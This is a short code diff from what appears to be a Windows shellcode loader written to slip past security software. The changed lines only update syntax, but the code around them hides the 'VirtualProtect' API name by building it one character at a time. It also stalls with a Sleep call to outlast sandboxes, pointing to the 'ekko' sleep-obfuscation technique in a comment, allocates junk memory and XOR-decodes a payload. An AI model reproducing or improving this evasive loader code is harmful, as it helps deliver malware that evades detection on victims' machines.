@@ -158,7 +158,7 @@ int main(int argc, char *argv[])
         //         return -2;
         // }
 
-        const char virtProt[15] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0};
+        const char virtProt[15]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0};
 
         Sleep(7500); // you could use "ekko" by crack5pider for this, i'm still lazy for this
 
@@ -172,7 +172,7 @@ int main(int argc, char *argv[])
                 free(junk_mem);
 
 #if DEBUG
-                printf("Before xor: %s\n\n", payload);
+                printf("Before xor: %s\n\n", payload.data());
 #endif
 
                 // a NULL terminator can cause very SERIOUS bugs so 1st remove it from the key
